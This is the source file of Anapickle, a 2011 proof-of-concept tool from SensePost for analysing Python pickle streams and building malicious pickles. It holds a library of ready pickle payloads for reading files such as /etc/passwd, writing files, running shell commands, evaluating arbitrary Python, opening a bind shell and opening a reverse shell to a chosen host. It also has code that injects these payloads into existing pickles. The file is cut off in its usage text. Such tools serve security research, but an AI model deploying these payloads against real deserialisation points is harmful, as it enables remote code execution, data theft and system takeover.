#
#
# Anapickle - marco@sensepost.com, (c) SensePost 2011
#
#
# This proof-of-concept tool is used to analyse Python Pickle streams,
# generate Pickle shellcode, and construct malpickles.
#
# If the Python looks bad, that's because it likely is. There are surely
# bugs and vulnerabilities. Stay safe.
#
# This script make use of eval() on command line parameters. Don't embed
# in anything that accepts input from untrusted sources.

import pprint
import re
#import cPickle
import pickle
import pickletools
import imp
import sys
import getopt
import subprocess
import tempfile
import os
import urllib
import base64
from pickletools import *

d_level = 3
# 1 - Error
# 2 - Warning
# 3 - Info
# 4 - Verbose
# 5 - Debug

def debug_print(level, msg):
  if level <= d_level:
    if level == 5:
      print "[d]",msg
    elif level == 4:
      print "[v]",msg
    elif level == 3:
      print "[i]",msg
    elif level == 2:
      print "[w]",msg
    elif level == 1:
      print "[e]",msg

def dprint(msg):
  debug_print(5, msg)

def vprint(msg):
  debug_print(4, msg)

def iprint(msg):
  debug_print(3, msg)

def wprint(msg):
  debug_print(2, msg)

def eprint(msg):
  debug_print(1, msg)

def set_d_level(l):
  global d_level
  d_level = l

class Anapickle:

  shellcodes = { \
    str : [ \
      { \
        "name" : "gen_fingerprint",
        "description" : "Returns Python env information",
        "parameters" : [ ],
        "result" : "returned",
        "shellcode" : "c__builtin__\neval\n(S'sys.version'\ntRp100\n0c__builtin__\neval\n(S'sys.exec_prefix'\ntRp101\n0c__builtin__\neval\n(S'sys.path'\ntRp102\n0c__builtin__\neval\n(S'sys.executable'\ntRp103\n0c__builtin__\neval\n(S'sys.modules'\ntRp104\n0c__builtin__\nrepr\n(g104\ntRp105\n0c__builtin__\neval\n(S'sys.argv'\ntRp106\n0c__builtin__\nrepr\n(g106\ntRp107\n0c__builtin__\nstr\n((S'sys.version'\ng100\nS'sys.exec_prefix'\ng101\nS'sys.path'\ng102\nS'sys.executable'\ng103\nS'sys.modules'\ng105\nS'sys.argv'\ng107\nltRp108\n0g108\n" 
      },\
      { \
        "name" : "gen_file_read",
        "description" : "Reads a file and returns the contents",
        "parameters" : [ { "name" : "FILENAME", "type" : str , "eg" : "\"FILENAME=/etc/passwd\"" },
                         { "name" : "LENGTH", "type" : int, "eg" : "LENGTH=1000" } ],
        "result" : "returned",
        "shellcode" : "c__builtin__\nopen\n(FILENAMEtRp100\n0c__builtin__\ngetattr\n(c__builtin__\nfile\nS'read'\ntRp101\n0c__builtin__\napply\n(g101\n(g100\nLENGTHltRp102\n0c__builtin__\ngetattr\n(c__builtin__\nfile\nS'close'\ntRp103\n0c__builtin__\napply\n(g103\n(g100\nltRp104\n0g102\n"
      },\
      { \
        "name" : "gen_file_write",
        "description" : "Create a new file and write a line into the new file",
        "parameters" : [ { "name" : "FILENAME", "type" : str , "eg" : "\"FILENAME=/etc/passwd\"" },
                         { "name" : "LINE", "type" : str, "eg" : "\"LINE='line1\\\\nline2\\\\nline3'\"" } ],
        "result" : "returned",
        "shellcode" : "c__builtin__\nopen\n(FILENAMES'w'\ntRp100\n0c__builtin__\ngetattr\n(c__builtin__\nfile\nS'write'\ntRp101\n0c__builtin__\napply\n(g101\n(g100\nLINEltRp102\n0c__builtin__\nstr\n(S'Finished'\ntRp103\n0g103\n"
      },\
      { \
        "name" : "gen_file_append",
        "description" : "Append a line to an existing file",
        "parameters" : [ { "name" : "FILENAME", "type" : str , "eg" : "\"FILENAME=/etc/passwd\"" },
                         { "name" : "LINE", "type" : str, "eg" : "\"LINE='line1\\\\nline2\\\\nline3'\"" } ],
        "result" : "returned",
        "shellcode" : "c__builtin__\nopen\n(FILENAMES'a'\ntRp100\n0c__builtin__\ngetattr\n(c__builtin__\nfile\nS'write'\ntRp101\n0c__builtin__\napply\n(g101\n(g100\nLINEltRp102\n0c__builtin__\nstr\n(S'Finished'\ntRp103\n0g103\n"
      },\

      { \
        "name" : "gen_exec_subprocess",
        "description" : "Command execution with subprocess module, Python 2.7 and upwards",
        "parameters" : [ { "name" : "CMD", "type" : str , "eg" : "\"CMD=uname\"" } , { "name" : "ARGS", "type" : list , "eg" : "\"ARGS=['-v','-s']\""} ],
        "result" : "returned",
        "shellcode" : "csubprocess\ncheck_output\n((CMDARGSltRp100\n0g100\n"
      },\
      { \
        "name" : "gen_exec_popen",
        "description" : "Command execution using os.popen(), returns command output",
        "parameters" : [ { "name" : "CMD", "type" : str , "eg" : "\"CMD=uname -a\"" } ],
        "result" : "returned",
        "shellcode" : "cos\npopen\n(CMDtRp100\n0c__builtin__\ngetattr\n(c__builtin__\nfile\nS'read'\ntRp101\n0c__builtin__\napply\n(g101\n(g100\nI1000\nltRp102\n0c__builtin__\ngetattr\n(c__builtin__\nfile\nS'close'\ntRp103\n0c__builtin__\napply\n(g103\n(g100\nltRp104\n0g102\n"
      },\
      { \
        "name" : "gen_eval",
        "description" : "Python evaluation. Your Python must set 'picklesmashed', which contains the snippet's output.",
        "parameters" : [ { "name" : "PYEXPR", "type" : str , "eg" : "\"PYEXPR='import subprocess;picklesmashed=subprocess.check_output(\\\"ls\\\")'\"" } ],
        "result" : "returned",
        "shellcode" : "c__builtin__\nglobals\n(tRp100\n0c__builtin__\ncompile\n(PYEXPRS\'\'\nS\'exec\'\ntRp101\n0c__builtin__\neval\n(g101\ng100\ntRp102\n0c__builtin__\ngetattr\n(c__builtin__\ndict\nS\'get\'\ntRp103\n0c__builtin__\napply\n(g103\n(g100\nS\'picklesmashed\'\nltRp104\n0g104\n"
      },\
      { \
        "name" : "appengine_fetch",
        "description" : "Appengine call to fetch a URL",
        "parameters" : [ { "name" : "URL", "type" : str , "eg" : "\"URL='http://www.sensepost.com'\"" } ],
        "result" : "returned",
        "shellcode" : "cgoogle.appengine.api.urlfetch\nfetch\n(URLtR"
      },\
      { \
        "name" : "appengine_userid",
        "description" : "Appengine call to fetch the current userid",
        "parameters" : [ ],
        "result" : "returned",
        "shellcode" : "cgoogle.appengine.api.users\nget_current_user\n(tRp100\n0c__builtin__\ngetattr\n(cgoogle.appengine.api.users\nUser\nS'user_id'\ntRp101\n0c__builtin__\napply\n(g101\n(g100\nltRp102\n0g102"
      },\
      { \
        "name" : "appengine_appid",
        "description" : "Appengine call to fetch the appid",
        "parameters" : [ ],
        "result" : "returned",
        "shellcode" : "cgoogle.appengine.api.app_identity\nget_application_id\n(tRp100\n0g100\n"
      },\
      { \
        "name" : "gen_bindshell_tcp",
        "description" : "Launches a bindshell on the host",
        "parameters" : [ {"name" : "PORT", "type" : int, "eg" : "\"PORT=12345\"" } ],
        "result" : "hidden",
        "shellcode" :"csocket\n__dict__\np101\n0c__builtin__\ngetattr\n(g101\nS'__getitem__'\ntRp102\n0g102\n(S'AF_INET'\ntRp100\n0csocket\n__dict__\np104\n0c__builtin__\ngetattr\n(g104\nS'__getitem__'\ntRp105\n0g105\n(S'SOCK_STREAM'\ntRp103\n0csocket\n__dict__\np107\n0c__builtin__\ngetattr\n(g107\nS'__getitem__'\ntRp108\n0g108\n(S'IPPROTO_TCP'\ntRp106\n0csocket\n__dict__\np110\n0c__builtin__\ngetattr\n(g110\nS'__getitem__'\ntRp111\n0g111\n(S'SOL_SOCKET'\ntRp109\n0csocket\n__dict__\np113\n0c__builtin__\ngetattr\n(g113\nS'__getitem__'\ntRp114\n0g114\n(S'SO_REUSEADDR'\ntRp112\n0csocket\nsocket\n(g100\ng103\ng106\ntRp115\n0c__builtin__\ngetattr\n(csocket\nsocket\nS'setsockopt'\ntRp116\n0c__builtin__\napply\n(g116\n(g115\ng109\ng112\nI1\nltRp117\n0c__builtin__\ngetattr\n(csocket\nsocket\nS'bind'\ntRp118\n0c__builtin__\napply\n(g118\n(g115\n(S''\nPORTtltRp119\n0c__builtin__\ngetattr\n(csocket\nsocket\nS'listen'\ntRp120\n0c__builtin__\napply\n(g120\n(g115\nI1\nltRp121\n0c__builtin__\ngetattr\n(csocket\nsocket\nS'accept'\ntRp122\n0c__builtin__\napply\n(g122\n(g115\nltRp123\n0c__builtin__\ngetattr\n(c__builtin__\ntuple\nS'__getitem__'\ntRp124\n0c__builtin__\napply\n(g124\n(g123\nI0\nltRp125\n0c__builtin__\ngetattr\n(csocket\n_socketobject\nS'fileno'\ntRp126\n0c__builtin__\napply\n(g126\n(g125\nltRp127\n0c__builtin__\nint\n(g127\ntRp128\n0csubprocess\nPopen\n((S'/bin/bash'\ntI0\nS'/bin/bash'\ng128\ng128\ng128\ntRp129\n0S'finished'\n"
      },\
      { \
        "name" : "gen_reverseshell_tcp",
        "description" : "Launches a reverse shell from the host",
        "parameters" : [ { "name" : "HOST", "type" : str, "eg" : "\"HOST\"='localhost'"} ,{"name" : "PORT", "type" : int, "eg" : "\"PORT=12345\"" } ],
        "result" : "hidden",
        "shellcode" : "csocket\n__dict__\np101\n0c__builtin__\ngetattr\n(g101\nS'__getitem__'\ntRp102\n0g102\n(S'AF_INET'\ntRp100\n0csocket\n__dict__\np104\n0c__builtin__\ngetattr\n(g104\nS'__getitem__'\ntRp105\n0g105\n(S'SOCK_STREAM'\ntRp103\n0csocket\n__dict__\np107\n0c__builtin__\ngetattr\n(g107\nS'__getitem__'\ntRp108\n0g108\n(S'IPPROTO_TCP'\ntRp106\n0csocket\nsocket\n(g100\ng103\ng106\ntRp109\n0c__builtin__\ngetattr\n(csocket\nsocket\nS'connect'\ntRp110\n0c__builtin__\napply\n(g110\n(g109\n(HOSTPORTtltRp111\n0c__builtin__\ngetattr\n(csocket\nsocket\nS'fileno'\ntRp112\n0c__builtin__\napply\n(g112\n(g109\nltRp113\n0csubprocess\nPopen\n((S'/bin/bash'\ntI0\nS'/bin/bash'\ng113\ng113\ng113\ntRp114\n0S'finished'\n"
      },\
    ], \
    unicode :  [ \
    ],
    int :  [ \
      { \
        "name" : "gen_exec_system",
        "description" : "Command executiong via os.system(), returns command return code",
        "parameters" : [ { "name" : "CMD", "type" : str , "eg" : "\"CMD=uname -a\"" } ],
        "result" : "hidden",
        "shellcode" : "cos\nsystem\n(CMDtRp100\n0g100\n"
      }\
    ]
  }

  wrappers = { \
    int : [ \
      { \
        "name" : "str_to_int", \
        "description" : "convert a string to an integer", \
        "input" : str, \
        "func" : "c__builtin__\nint\n(ARGStR" \
      }
    ], \
    str : [ \
      { \
        "name" : "uni_to_str", \
        "description" : "convert a unicode string into a string", \
        "input" : unicode, \
        "func" : "c__builtin__\nstr\n(ARGStR" \
      }, \
      { \
        "name" : "strip", \
        "description" : "strip '\\n' from a string", \
        "input" : str, \
        "func" : "cstring\nstrip\n(ARGStR" \
      }, \
      { \
        "name" : "int_to_str", \
        "description" : "converts ints to strings", \
        "input" : int, \
        "func" : "c__builtin__\nstr\n(ARGStR" \
      }, \
      { \
        "name" : "html_html", \
        "description" : "wraps a str in <html></html> tags", \
        "input" : str, \
        "func" : "c__builtin__\nstr\n(S''\ntRp100\n0c__builtin__\ngetattr\n(c__builtin__\nstr\nS'format'\ntRp101\n0c__builtin__\napply\n(g101\n(S'{0}{1}{2}'\nS'<html>'\nARGSS'</html>'\nltRp102\n0g102\n" \
      }, \
      { \
        "name" : "html_pre", \
        "description" : "wraps a str in <pre></pre> tags", \
        "input" : str, \
        "func" : "c__builtin__\nstr\n(S''\ntRp100\n0c__builtin__\ngetattr\n(c__builtin__\nstr\nS'format'\ntRp101\n0c__builtin__\napply\n(g101\n(S'{0}{1}{2}'\nS'<pre>'\nARGSS'</pre>'\nltRp102\n0g102\n" \
      }, \
      { \
        "name" : "get_attr", \
        "description" : "returns a string attribute e.g. get_attr('url')", \
        "parameters" : 1,
        "input" : str, \
        "func" : "c__builtin__\ngetattr\n(ARGSS'ARG0'\ntR" \
      }, \
#TODO: call_method shellcode should take the name of a method and apply it to the chosen shellcode
#e.g -w call_method(user_id) -g appengine_userid
      { \
        "name" : "call_method", \
        "description" : "returns a string attribute e.g. get_attr('url')", \
        "parameters" : 1,
        "input" : str, \
        "func" : "c__builtin__\ngetattr\n(ARGSS'ARG0'\ntR" \
      } \
    ], \
    unicode : [ \
      { \
        "name" : "str_to_uni", \
        "description" : "convert a string to a unicode string", \
        "input" : str, \
        "func" : "c__builtin__\nunicode\n(ARGStR" \
      } \
    ] \
  }


  
#this will not simulate all pickles, as full intruction support hasn't been attempted
  def sim_pickle(self):
    dprint("Starting sim_pickle()")
    simstack = []
    simmemo = {}
    reduce_counter = 0
#simulate stack MARK with some random string
    MARK = "ff89fe5bfb1383970cdc5218dafd0d9fb7b5f2d0"
    try:
      for opcode, arg, pos in genops(self.picklestream):
#        pprint.pprint(simstack)
#        pprint.pprint(simmemo)
#        print opcode.name
        if opcode.name == "GLOBAL" or opcode.name == "INST":
          try:
            mod = arg.split(" ")[0]
            callable = arg.split(" ")[1]
            exec("from "+mod+" import "+callable)
            if [mod, callable] not in self.callables:
              self.callables.append([mod, callable])
          except ImportError, SyntaxError:
            self.error_callables.append([mod, callable])
            
          simstack.append(arg.replace(" ","."))
          reduce_counter += 1
        elif opcode.name == "REDUCE":
          #Reduce takes one TUPLE
          margs = simstack.pop()
          m = simstack.pop()
          if type(margs) == tuple:
            #print "\t",m,"(",pprint.pformat(a),")"
            simstack.append("<"*reduce_counter+m+""+pprint.pformat(margs)+">"*reduce_counter)
            reduce_counter -= 1
          else:
            eprint("Error at "+str(pos)+": Argument to REDUCE isn't a tuple, it's a "+str(type(margs)))
            #pprint.pprint(margs)
        elif opcode.name == "BUILD":
          argument = simstack.pop()
          callable = simstack.pop()
          simstack.append("#!##"+callable+""+pprint.pformat(argument)+"##!#")
        elif opcode.name == "EMPTY_DICT":
          simstack.append({})
        elif opcode.name == "DICT":
          (k,v)='',''
          item=simstack.pop()
          d = {}
          while item != MARK:
            v = item
            k = simstack.pop()
            if k != MARK:
              d[k] = v
            item = simstack.pop()

          simstack.append(d)
        elif opcode.name == "EMPTY_TUPLE":
          simstack.append(tuple())
        elif opcode.name == "TUPLE":
          callable_arg = ""
          t=[]
          item=simstack.pop()
          while item!=MARK:
            t.append(item)
            item=simstack.pop()
          t.reverse()
          simstack.append(tuple(t))
        elif opcode.name == "EMPTY_LIST":
          simstack.append([])
        elif opcode.name == "LIST":
          #pprint.pprint(simstack)
          #pprint.pprint(simmemo)
          #print opcode.name
          item=simstack.pop()
          t=[]
          while item!=MARK:
            t.append(item)
            item=simstack.pop()
          t.reverse()
          simstack.append(t)
        elif opcode.name == "STRING":
          simstack.append(arg)
          self.entities[str].append({"position" : pos, "value" : arg})
          self.good_candidate = True
        elif opcode.name == "UNICODE":
          simstack.append(unicode(arg))
          self.entities[unicode].append({"position" : pos, "value" : unicode(arg)})
          self.good_candidate = True
        elif opcode.name == "INT":
          self.entities[int].append({"position" : pos, "value" : int(arg)})
          simstack.append(int(arg))
        elif opcode.name == "MARK":
          simstack.append(MARK)
        elif opcode.name == "PUT":
          simmemo[arg] = simstack[-1]
          if arg > self.highest_slot_seen :
            self.highest_slot_seen = arg
        elif opcode.name == "GET":
          simstack.append(simmemo[arg])
        elif opcode.name == "NONE":
          simstack.append(None)
        elif opcode.name == "APPEND":
          v = simstack.pop()
          l = simstack.pop()
          if type(l) == list:
            simstack.append(l+[v])
          else:
            eprint("Error: Expecting a list but found a "+str(type(l)))
        elif opcode.name == "SETITEM":
          v = simstack.pop()
          k = simstack.pop()
          d = simstack.pop()
          if type(d) == dict:
            d[k] = v
            simstack.append(d)
          else:
            eprint("Error: Expecting a dict but found a "+str(type(d)))
        elif opcode.name == "SETITEMS":
          d={}
          while simstack[-1] != MARK:
            v = simstack.pop()
            k = simstack.pop()
            d[k] = v
          simstack.pop()#consume the MARK
          old_d = simstack.pop()
          if type(old_d) == dict:
            for key in d:
              old_d[key] = d[key]
            simstack.append(old_d)
          else:
            eprint("Error: Expecting a dict but found a "+str(type(d)))

        elif opcode.name == "POP":
          simstack.pop()
        elif opcode.name == "POP_MARK":
          while simstack[-1] != MARK:
            simstack.pop()
          simstack.pop()
        elif opcode.name == "DUP":
          simstack.append(simstack[-1])
        elif opcode.name == "STOP":
          self.final_str = str(simstack.pop())
        else:
          eprint("Unknown opcode: "+opcode.name)
            
    except IndexError, e:
      self.simulator_failed = True
      eprint("Simulator error at picklestream byte "+str(pos)+". Error was \""+Ex.geterr(e)+"\"")
      return False
    
    return True
      

  def format_pickle_summary(self):
    out = "\nPickle summary\n==================\n\nGood candidate for exploitation : "+str(self.good_candidate)+"\n\nPickle length : "+str(len(self.picklestream))+"\n\n"
    #out += "Pickle length: "+len(self.picklestream)
    if self.pickle_loaded or self.load_failed: #Only print these out if we've tried to load a pickle by calling load_pickle()
      out += "Pickle loaded : "+str(self.pickle_loaded)+"\n\n"
      out += "Load failed : "+str(self.load_failed)+"\n\n"
    if len(self.callables) > 0:
      out += "Callables used : "
      for callable in self.callables:
        out += callable[0]+"."+callable[1]+", "
      out=out[:-2]+"\n\n"
    if len(self.error_callables) > 0:
      out += "Unavailable callables according to simulator: "
      for callable in self.error_callables:
        out += callable[0]+"."+callable[1]+", "
      out=out[:-2]+"\n\n"
    if len(self.entities) > 0:
      out += "Entities : "+pprint.pformat(self.entities, 1, 80)+"\n"

    if self.highest_slot_seen > 100:
      out += "\nWARNING : This pickle uses more than a 100 slots. You'll have to fixup the shellcode manually!\n\n"
    if self.pickle_loaded:
      out += "Final type : "+str(type(self.lpickle))+"\n\n"

    return out

  def format_pickle(self, style = "Basic", make_output_exec = True):
    if style == "Basic":
      for opcode, arg, pos in genops(self.picklestream):
        out = str(pos) + "\t" + opcode.name
        if arg is not None:
          out += " " + repr(arg)
        return out
    elif style == "SlightlyBetter":
      if make_output_exec:
#try to make the output valid python, though it will fail if callables are placed on the stack and not REDUCEd
        l = 0
        while self.final_str.find("<"*l) > -1:
          l += 1
        l -= 1
        while l > 0:
          self.final_str = self.final_str.replace("\""+"<"*l,"")
          self.final_str = self.final_str.replace(">"*l+"\"","")
          self.final_str = self.final_str.replace("<"*l,"")
          self.final_str = self.final_str.replace(">"*l,"")
          l -= 1

      
      self.final_str = self.final_str.replace("#!##","")
      self.final_str = self.final_str.replace("##!#","")
      return self.final_str
    else:
      raise Exception("Unknown printing style: "+style)

  def load_pickle(self):
    try:
      self.error_callables = []
      self.lpickle = pickle.loads(self.picklestream)
      self.pickle_loaded = True
      return True
    except IndexError, e:
      self.load_failed = True
      eprint("Error in PVM: "+Ex.geterr(e))
    except ImportError, e:
      self.load_failed = True
      eprint("Error in loads(): "+Ex.geterr(e))
      r = re.match("No module named (.*)",Ex.geterr(e))
      if r != None:
        self.error_callables += [r.group(1)]
      return self.error_callables
    except AttributeError, e:
      self.load_failed = True
      eprint("Error in loads(): "+Ex.geterr(e))
      r = re.match("'(.*)' object has no attribute '(.*)'",Ex.geterr(e))
      if r != None:
#this exception doesn't reveal the full module and callable that couldn't be imported
#instead, we try to fixup the lack of info by searching backwards in the pickle stram
#for the callable. unfortunately, this may not work out in all cases as we can't rewind
#the intruction sequence. instead, pick an anchor ('\n') and search fowards for a 'c' or
#GLOBAL instr. this is likely to not work in all cases.
        callable_start = self.picklestream.find("\n"+r.group(2)+"\n")
        module_start = self.picklestream.rfind("\n",0,callable_start)+1
#now find the 'c' instruction
        module_start = self.picklestream.find("c",module_start,callable_start)+1


        self.error_attribute_names += [self.picklestream[module_start:callable_start]+"."+r.group(2)]
      return self.error_attribute_names
    
  def verify_stream(self):
    return self.sim_pickle()
    #self.print_pickle()

  def get_string_positions():
    return []

  def set_stream(self, picklestream):
    self.picklestream = picklestream

  def format_entities(self):
    out = "Entities\n"
    i = 0
    type = ""
    for t in self.get_entities():
      if type != str(t["type"]):
        type = str(t["type"])
        out += "\t"+type+"\n"
      out += "\t\t["+str(i)+"] "+str(t["value"])+" ("+str(t["position"])+")\n"
      i+=1
    return out

  def get_entities(self):
    self.entities_list=[]
    for t in self.entities:
#      if t == str:
      for entry in self.entities[t]:
        self.entities_list.append({"type" : t, "value" : entry["value"], "position" : entry["position"]})
#      elif t == unicode:
#        for entry in self.entities[t]:
#          self.entities_list.append({"type" : "unicode", "value" : entry["value"], "position" :entry["position"]})

    return self.entities_list

#save_wrapper is called once for each f in f_1(f_2(f_3()))
  def save_wrapper(self, wrapper_func):
    dprint("Entered save_wrapper")
    func = None
    arguments = []
    if wrapper_func.find('(') > -1:
      if wrapper_func.find(')') == -1:
        raise Exception("Wrapper "+wrapper_func+" missing )")
      arguments = wrapper_func[wrapper_func.find('(')+1:wrapper_func.find(')')].split(';')
      wrapper_func = wrapper_func[:wrapper_func.find('(')]

    for t in self.wrappers:
      for e in self.wrappers[t]:
        if e["name"] == wrapper_func:
          dprint("Found wrapper function %s" % wrapper_func)
          e["type"] = t
          func = e

          if func.has_key("parameters"):
            if func["parameters"] != len(arguments):
              raise Exception("Wrapper "+wrapper_func+" requires %d parameters, you supplied %d." % (func["parameters"],len(arguments)))
            func["parameters"] = arguments
    if func == None:
      raise Exception("Wrapper "+wrapper_func+" not found")

#check for type mismatches in the function chains
#if no errors, then insert the func
    if len(self.wrappers_list["funcs"]) > 0:
      if self.wrappers_list["funcs"][0]["input"] != func["type"]:
        dprint("Type error in wrapper functions")
        raise Exception("Type mismatch between %s and %s, expecting %s but got %s" % (self.wrappers_list["funcs"][0]["name"],func["name"],str(self.wrappers_list["funcs"][0]["input"]),str(func["type"])))

      self.wrappers_list["input"]  = func["input"]
      dprint("Wrapper chain takes input type %s" % str(func["input"]))
    else:
      self.wrappers_list["output"]  = func["type"]
      self.wrappers_list["input"]  = func["input"]
      dprint("Wrapper chain takes input type %s" % str(func["type"]))
      dprint("Wrapper chain produces output type %s" % str(func["type"]))

    self.wrappers_list["funcs"] = [func] + self.wrappers_list["funcs"]
    dprint("Wrapper chain is :\n%s" % repr(self.wrappers_list["funcs"]))


#creates the shellcode for the wrapper functions
#insert SC_PLACE at the point where the malicious shellcode is inserted later on
  def build_func_call_chain(self):
    if len(self.wrappers_list["funcs"]) < 1:
      raise Exception("No wrapper functions saved")

    call_chain_code = self.wrappers_list["funcs"][0]["func"].replace("ARGS","SC_PLACE") 
    if self.wrappers_list["funcs"][0].has_key("parameters"):
      i=0
      for p in self.wrappers_list["funcs"][0]["parameters"]:
        dprint("replaced param %d with %s" % (i, p))
        call_chain_code = call_chain_code.replace("ARG%d"%i,p)
        i+=1
        dprint("Call chain code after param substitution is:\n %s"%call_chain_code)
    dprint("Call chain code after func addition is:\n %s"%call_chain_code)



    
    #dprint("Call chain code:\n %s"%call_chain_code)

    for f in self.wrappers_list["funcs"][1:]:
      call_chain_code = f["func"].replace("ARGS", call_chain_code)
      if f.has_key("parameters"):
        i=0
        for p in f["parameters"]:
          dprint("replaced param %d with %s" % (i, p))
          call_chain_code = call_chain_code.replace("ARG%d"%i,p)
          i+=1
          dprint("Call chain code after param substitution is:\n %s"%call_chain_code)
      dprint("Call chain code after func addition is:\n %s"%call_chain_code)

    dprint("Final call chain code is:\n %s"%call_chain_code)
    
    return { "input": self.wrappers_list["input"], "output" : self.wrappers_list["output"], "chain" : call_chain_code }





  @staticmethod
  def find_shellcode_by_name(name):
    for t in Anapickle.shellcodes:
      for e in Anapickle.shellcodes[t]:
        if e["name"] == name:
          dprint("Found requested shellcode")
          e["type"] = t
          return e
    raise Exception('Shellcode not found. Run anapickle.py -p for a list of available shellcodes')

  @staticmethod
  def convert_python_vals_into_pickle(py_vals):
    if type(py_vals) == str:
      return "S'"+py_vals+"'\n"
    elif type(py_vals) == unicode:
      return "V'"+py_vals+"'\n"
    elif type(py_vals) == list:
      out = ""
      for i in py_vals:
        out += Anapickle.convert_python_vals_into_pickle(i)
      return out
    elif type(py_vals) == int:
      return "I"+str(py_vals)+"\n"
    else:
      raise Exception("Can't handle parameter type: "+str(type(py_vals)))

  @staticmethod
  def gen_shellcode(shellcode_name, shellcode_arguments):
    sc = Anapickle.find_shellcode_by_name(shellcode_name)
    cont = True
#verify arguments
    for param in sc["parameters"]:
      if not shellcode_arguments.has_key(param["name"]):
        eprint("Shellcode requires parameter "+param["name"])
        cont = False
      else:
        dprint("Found "+param["name"])
        if type(shellcode_arguments[param["name"]]) != param["type"]:
          eprint("Parameter "+param["name"] +" should be of type "+str(param["type"])+", instead it's "+str(type(shellcode_arguments[param["name"]])))
          cont = False
    if not cont:
      sys.exit(1)

#now construct the shellcode by performing the substitutions
    code = sc["shellcode"]
    dprint("Using raw shellcode: "+repr(code))
    for param in sc["parameters"]:
      code=code.replace(param["name"], Anapickle.convert_python_vals_into_pickle(shellcode_arguments[param["name"]]))

    return {"code" : code, "type" : sc["type"] }

#this method takes an entity to be replaced and the shellcode that will replace it
#and figures out whether the types of the shellcode match that of the entity
  def replace_and_fixup(self, rep, sc):
    if self.entities_list == None:
      self.get_entities()
    try:
      if rep < 0:
        raise IndexError
      e = self.entities_list[rep]
    except IndexError:
      eprint("No such entity. You selected "+str(rep)+" while I only know about "+str(len(self.entities_list))+" entities.\n\t(Don't forget, I index from 0)\nEntities I can extract:")
      eprint(self.format_entities())
      eprint("Bailing out...")
      sys.exit(1)

    if e["type"] != sc["type"]:
      eprint("Type mismatch between entity to be replaced and shellcode return type\n\tEntity: "+str(e["type"])+"\n\tShellcode: "+str(sc["type"])+"\nBailing...")
      sys.exit(1)
    dprint("Replacing "+e["value"])
    del_len = len(self.picklestream[int(e["position"]):self.picklestream.find("\n",int(e["position"]))])+1
    dprint("Replacing "+str(del_len)+" bytes at position "+str(e["position"]))
    self.picklestream = self.picklestream[0:e["position"]]+sc["code"]+self.picklestream[(e["position"]+del_len):]

#now fixup the positions of the remaining entities
    diff_len = len(sc) - del_len
    dprint("Original pickle "+str(len(self.picklestream))+"b, string to be replaced "+str(del_len)+"b, shellcode "+str(len(sc))+"b, diff "+str(diff_len)+"b")
    i = 0
    while i < len(self.entities_list):
      if self.entities_list[i]["position"] >= e["position"]:
        dprint("Fixing position for "+str(self.entities_list[i]["value"])+", shifting position from "+str(self.entities_list[i]["position"])+" to "+str(int(self.entities_list[i]["position"])+diff_len))
#entity occurs after the insert, fix its position
        self.entities_list[i]["position"] += diff_len
      i+=1

#fixup slot GETs and PUTs, to ensure no overlap between present calls and the shellcode
    i = self.picklestream.find('_GPS_')
    while i > -1:
      self.highest_slot_seen += 1
      self.picklestream = self.picklestream[:i] + str(self.highest_slot_seen) + self.picklestream[i+1:]
      i = self.picklestream.find('_GPS_')
#fixup done
    dprint(self.picklestream)

#this method takes an index into the picklestream and shellcode, and returns the pickle stream
#with the shellcode inserted at that position
  def insert_at_byte_position(self, index, sc):
    if index < 0 or index > len(self.picklestream):
      if index < 0:
        eprint("Refusing to write to negative positions")
      if index > len(self.picklestream):
        eprint("Refusing to write past the end of the shellcode")
      eprint("Bailing out...")
      sys.exit(1)

    self.picklestream = self.picklestream[:index] + sc + self.picklestream[index:]

#insert done
    dprint(self.picklestream)
    
  def __init__(self, picklestream = None):
    self.set_stream(picklestream)
    self.callables = [] #List of callables used by the pickle
    self.entities = {str : [], unicode : [], int : []} #List of all entities for which we can replace shellcode
    self.error_callables = [] #List of modules that failed to load in loads()
    self.error_attribute_names = [] #List of attributes that weren't present in loaded modules
    self.pickle_loaded = False
    self.simulator_failed = False
    self.load_failed = False
    self.good_candidate = False #If the picklestream has attributes easily replaced, set this flag
    self.summary = False #print out the summary
    self.entities_list = None
    self.wrappers_list = {"input" : "", "output" : "", "code" : "", "funcs" : []}
    self.highest_slot_seen = 0


    if picklestream != None:
      self.picklestream = picklestream
    #if verifystream:
    #  self.verify_stream()

    #if not self.simulator_failed:
    #  self.test(loadpickle)

 
  def test(self, loadpickle):

    print(self.format_pickle_summary())
    print("Reconstructed pickle: "+self.format_pickle("SlightlyBetter")+"\n")

    if loadpickle:
      print("Pickle loading:\n\n")
      r = self.load_pickle()
      if r == True:
        print("Pickle loaded.\n")
      else:
        print("Pickle could not be loaded!!!\n\n")
        if len(self.error_attribute_names) > 0:
          print("Attributes not present : ")
          print(", ".join(self.error_attribute_names)+"\n\n")
        if len(self.error_callables) > 0:
          print("Callables not present : ")
          print(", ".join(self.error_callables)+"\n\n")

class Ex:
  @staticmethod
  def geterr(ex):
#    ver = float(sys.version[0:3])
#    if ver < 2.6:
#      return ex.message
#    elif ver == 2.6:
#      return ex.__str__()
#    elif ver >= 2.6:
#      return ex.strerror
    if hasattr(ex,"strerror"):
      return ex.strerror
    elif hasattr(ex,"__str__"):
      return ex.__str__()
    elif hasattr(ex,"message"):
      return ex.message
    else:
      print("Can't handle this exception, dumping it: "+repr(e))
      return ""


class AnapickleManager:

  def print_usage(self):
    print("""
\t-h
\t\tPrint help
\t-p
\t\tList available shellcodes and wrappers, and exit
\t-f <file>
\t\tRead picklestream from <file>. For stdin, use '-' or leave -f out
\t-o <file>
\t\tWrite shellcode or malpickle into <file> instead of to stdout
\t-s
\t\tRun the simulator on the picklestream
\t-m
\t\tPrint out a summary
\t-a
\t\tApply -s -m -l -e
\t-i
\t\tUse interactive mode
\t-l
\t\tCall loads() on the picklestream. Don't do this on unknown streams.
\t-c
\t\tSimulate and print out callables only
\t-e
\t\tGet entities suitable for shellcode substitution
\t-u
\t\tRun pickletools.dis() on the picklestream
\t-v
\t\tVerify generated picklestream. Also potentially dangerous on 
\t\tunknown streams or if the shellcode causes damage.

\t-g <shellcode> [ <arg>=<val, ... ]
\t\tGenerate <shellcode> only and exit
\t-b
\t\tURL-encode generated shellcode (only works with -g)
\t-k
\t\tPython-encode generated shellcode (only works with -g)
\t-n
\t\tPass the pickle through Base64 for decoding and encoding


\t-r <byte_index> <shellcode> [ <arg>=<val>, ... ]
\t\tInsert named <shellcode> at <byte_index> in the stream

\t-x <entitiy_num> <shellcode> [ <arg>=<val>, ... ]
\t\tInsert named <shellcode> in place of entity <entity_num>

\t-w <wrapper_func_1>,<wrapper_func_2>,...
\t\tApply shellcode = wrapper_func_1(wrapper_func_2(shellcode))
\t-y
